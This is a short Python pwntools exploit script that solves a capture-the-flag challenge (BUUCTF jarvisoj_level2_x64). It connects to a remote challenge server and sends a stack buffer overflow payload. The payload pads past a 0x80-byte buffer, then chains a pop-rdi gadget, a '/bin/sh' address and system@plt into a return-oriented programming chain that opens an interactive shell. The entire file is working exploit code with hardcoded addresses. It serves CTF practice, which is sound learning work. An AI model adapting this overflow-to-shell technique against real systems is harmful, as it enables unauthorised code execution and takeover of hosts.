from pwn import *
from LibcSearcher import *

# BUUCTF - jarvisoj_level2_x64
context(log_level = 'debug', arch = 'amd64', os = 'linux')
p = remote('node5.buuoj.cn', 26963)
#p=process('./pwn')

pop_rdi_ret = 0x4006b3
system_plt_addr = 0x4004c0
binsh_addr = 0x600A90

payload = b'a'*(0x80+0x8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_plt_addr)
p.sendlineafter(b'Input:', payload)

p.interactive()
